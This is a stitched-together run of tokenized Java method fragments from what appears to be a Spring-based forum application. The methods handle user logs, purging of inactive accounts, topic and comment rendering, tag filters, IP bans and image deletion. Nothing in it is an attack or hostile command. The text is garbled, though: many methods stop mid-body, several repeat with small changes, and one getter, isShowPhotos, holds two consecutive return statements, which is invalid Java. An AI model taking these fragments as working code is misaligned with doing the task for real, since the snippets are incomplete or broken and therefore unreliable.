public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy ) { ImmutableMap < String , String > params ; if ( invitedBy . isPresent ( ) ) { params = ImmutableMap . of ( OPTION_IP , ip , OPTION_INVITED_BY , invitedBy . get ( ) . toString ( ) ) ; } else { params = ImmutableMap . of ( OPTION_IP , ip ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public List < PreparedUserLogItem > prepare ( @Nonnull List < UserLogItem > items ) { return ImmutableList . copyOf ( Lists . transform ( items , item - > { 
public void deleteInactivated ( ) { logger . info ( " Deleting non-activated accounts " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 days'::interval) " ) ; int deleted = jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 days'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; int deletedBlocked = jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval " ) ; logger . info ( " Deleted {} non-activated; {} blocked accounts " , deleted , deletedBlocked ) ; } 
public boolean isGoodDomainEmail ( InternetAddress email ) { return ! BAD_DOMAINS . contains ( email . getAddress ( ) . replaceFirst ( " ^[^@]+@ " , " " ) . toLowerCase ( ) ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( validator ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void checkView ( Group group , Topic message , @Nullable User currentUser , User topicAuthor , boolean showDeleted ) throws MessageNotFoundException , AccessViolationException { Preconditions . checkArgument ( message . getGroupId ( ) = = group . getId ( ) ) ; Preconditions . checkArgument ( message . getAuthorUserId ( ) = = topicAuthor . getId ( ) ) ; if ( currentUser = = null | | ! currentUser . isModerator ( ) ) { boolean unauthorized = currentUser = = null | | currentUser . isAnonymous ( ) ; 
public boolean isShowPhotos ( ) { return false ; return showPhotos; 
public void deleteInactivated ( ) { logger . info ( " Deleting non-activated accounts " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'12 hours'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'12 hours'::interval) " ) ; int deleted = jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'12 hours'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; int deletedBlocked = jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval " ) ; logger . info ( " Deleted {} non-activated; {} blocked accounts " , deleted , deletedBlocked ) ; } 
public Tuple2 < Integer , DateTime > mapRow ( ResultSet rs , int rowNum ) throws SQLException { return Tuple2 . apply ( rs . getInt ( " id " ) , new DateTime ( rs . getTimestamp ( " lastlogin " ) . getTime ( ) ) ) ; } 
public boolean canCorrect ( ) { return corrector & & ! isFrozen ( ) ; } 
public void toggleCorrector ( User user , User moderator ) { if ( user . isCorrector ( ) ) { jdbcTemplate . update ( " UPDATE users SET corrector='f' WHERE id=? " , user . getId ( ) ) ; 
private ApiDeleteInfo loadDeleteInfo ( Comment comment ) throws UserNotFoundException { ApiDeleteInfo deleteInfo = null ; if ( comment . isDeleted ( ) ) { Optional < DeleteInfo > info = deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; deleteInfo = info . map ( i - > new ApiDeleteInfo ( userDao . getUserCached ( i . getUserid ( ) ) . getNick ( ) , i . getReason ( ) ) ) . orElse ( null ) ; } return deleteInfo ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) { Topic topic = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( topic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! topic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( topic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . toString ( ) ) ) ; } 
public PreparedTopic prepareTopic ( Topic message , User user ) { return prepareTopic ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > tags , User user , MessageText text ) { return prepareTopic ( message , 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > tags , Poll newPoll , MessageText text , Image image ) { return prepareTopic ( message , 
private PreparedTopic prepareTopic ( Topic topic , List < TagRef > tags , boolean minimizeCut , Optional < PreparedPoll > poll , User user , MessageText text , Optional < Image > image ) { try { Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareTopic ( message , tags . get ( message . getId ( ) ) , true , Optional . empty ( ) , user , textMap . get ( message . getId ( ) ) , Optional . empty ( ) ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
private Map < Integer , MessageText > loadTexts ( List < Topic > messages ) { return msgbaseDao . getMessageText ( messages . stream ( ) . map ( Topic : : getId ) . collect ( Collectors . toList ( ) ) ) ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareTopic ( message , tags . get ( message . getId ( ) ) , true , Optional . empty ( ) , null , textMap . get ( message . getId ( ) ) , Optional . empty ( ) ) ; pm . add ( preparedMessage ) ; } return pm ; } 
private Optional < DeleteInfo > loadDeleteInfo ( Comment comment ) { if ( comment . isDeleted ( ) ) { return deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; 
private PreparedRSSComment prepareRSSComment ( MessageText messageText , Comment comment ) { User author = userService . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = textService . renderTextRSS ( messageText ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForReplyto ( Comment comment , @Nullable User currentUser , Profile profile , Topic topic ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userService . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , Optional . empty ( ) , comment , Optional . empty ( ) , profile , topic , ImmutableSet . of ( ) , ImmutableSet . of ( ) , currentUser ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , MessageText message ) { User author = userService . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = textService . renderCommentText ( message , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
public List < PreparedRSSComment > prepareCommentListRSS ( List < Comment > list ) { List < PreparedRSSComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , Topic topic , Set < Integer > hideSet , @Nullable User currentUser , Profile profile ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( list . stream ( ) . map ( Comment : : getId ) . collect ( Collectors . toList ( ) ) ) ; Map < Integer , User > users = loadUsers ( list . stream ( ) . map ( Comment : : getUserid ) . collect ( Collectors . toList ( ) ) ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } Set < Integer > samePageComments = list . stream ( ) . map ( Comment : : getId ) . collect ( Collectors . toSet ( ) ) ; return list . stream ( ) . map ( comment - > { MessageText text = texts . get ( comment . getId ( ) ) ; 
public List < PreparedCommentsListItem > prepareCommentsList ( List < CommentsListItem > comments ) { Map < Integer , User > users = loadUsers ( comments . stream ( ) . map ( CommentsListItem : : getAuthorId ) . collect ( Collectors . toList ( ) ) ) ; Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( comments . stream ( ) . map ( CommentsListItem : : getCommentId ) . collect ( Collectors . toList ( ) ) ) ; return comments . stream ( ) . map ( comment - > { User author = users . get ( comment . authorId ( ) ) ; 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int tagId = userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( tagId ) ) ; } 
public static DateTimeFormatter dateLong ( ) { return DATE_LONG ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , page , filter , groupName , msgid , 0 ) ; } 
public ModelAndView getMessageThread ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " threadRoot " ) int threadRoot ) { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , 0 , filter , groupName , msgid , threadRoot ) ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , false ) ; } Topic topic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( topic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( topic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public TopicMenu getTopicMenu ( PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; boolean undeletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; undeletable = groupPermissionService . isUndeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; undeletable = false ; } Optional < Userpic > userpic ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = Optional . of ( userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , true ) ) ; } else { userpic = Optional . empty ( ) ; } int postscore = topicPermissionService . getPostscore ( message . getGroup ( ) , message . getMessage ( ) ) ; boolean showComments = postscore ! = TopicPermissionService . POSTSCORE_HIDE_COMMENTS ; return new TopicMenu ( topicEditable , 
public UserEventDao userEventDao ( DataSource ds , PlatformTransactionManager transactionManager ) { return new UserEventDao ( ds , transactionManager ) ; } 
public ModelAndView serverInfo ( ) { List < Tuple2 < User , Object > > moderators = userService . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < Tuple2 < User , Object > > correctors = userService . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public UserDao userDao ( UserLogDao userLogDao , DataSource dataSource ) { return new UserDao ( userLogDao , dataSource ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = Template . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , ts , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) { Topic message = messageDao . getById ( msgid ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; PreparedTopic preparedMessage = topicPrepareService . prepareTopic ( message , Template . getCurrentUser ( ) ) ; topicPermissionService . checkView ( group , message , Template . getCurrentUser ( ) , preparedMessage . getAuthor ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , Template . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , false ) ; return modelAndView ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , Template . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , Template . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , Template . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , Template . getCurrentUser ( ) ) ; imageService . deleteImage ( Template . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( topic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView topics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject ) ) ; 
public ModelAndView topicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject + " &lastmod=true " ) ) ; 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) { session . removeAttribute ( " image " ) ; Tuple2 < Integer , Set < Integer > > result = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; int msgid = result . _1 ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , result . _2 ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , response , groupName , msgid ) ; 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = Template . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , text ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , tagName , true ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( request , tagName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; try { int id = userTagService . favoriteAdd ( user , tagName ) ; 
public ModelAndView favoriteTagDel ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , tagName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int tagId = userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( tagId ) ) ; } 
public ModelAndView showForm ( ServletRequest request ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Template . getCurrentUser ( ) . checkFrozen ( ) ; return new ModelAndView ( " addphoto " ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , ts , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) { Topic message = messageDao . getById ( msgid ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; PreparedTopic preparedMessage = topicPrepareService . prepareTopic ( message , AuthUtil . getCurrentUser ( ) ) ; topicPermissionService . checkView ( group , message , AuthUtil . getCurrentUser ( ) , preparedMessage . getAuthor ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , AuthUtil . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , AuthUtil . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , AuthUtil . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
